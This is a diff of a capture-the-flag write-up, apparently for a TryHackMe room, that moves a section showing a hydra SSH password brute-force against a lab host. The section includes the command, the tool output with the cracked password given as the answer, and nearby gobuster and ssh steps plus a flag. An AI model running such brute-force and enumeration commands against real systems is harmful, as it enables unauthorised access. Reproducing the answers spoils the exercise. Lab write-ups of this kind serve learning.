@@ -141,6 +141,24 @@ ftp> get <file name>
 ft> mget *.txt
 
 ```
+
+## Hydra for bruteForcing
+```sh
+└─$ hydra -l lin -P locks.txt -t 6 ssh://10.10.49.150
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-04 05:16:07
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
+[DATA] attacking ssh://10.10.49.150:22/
+[22][ssh] host: 10.10.49.150   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-04 05:16:15
+
+
+```
+- Use `man hydra` for the manual
+> ### Answer: `RedDr4gonSynd1cat3`
+
 ## Login to ssh
 ```sh
 └─$ ssh lin@10.10.49.150   
@@ -160,22 +178,6 @@ THM{CR1M3_SyNd1C4T3}
 ```
 - It's seeking password
 
-## Hydra for bruteForcing
-```sh
-└─$ hydra -l lin -P locks.txt -t 6 ssh://10.10.49.150
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-04 05:16:07
-[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
-[DATA] attacking ssh://10.10.49.150:22/
-[22][ssh] host: 10.10.49.150   login: lin   password: RedDr4gonSynd1cat3
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-04 05:16:15
-
-
-```
-- Use `man hydra` for the manual
-> ### Answer: `RedDr4gonSynd1cat3`
 ## Directory Enum
 ```sh
 └─$ gobuster dir -u http://10.10.49.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt 
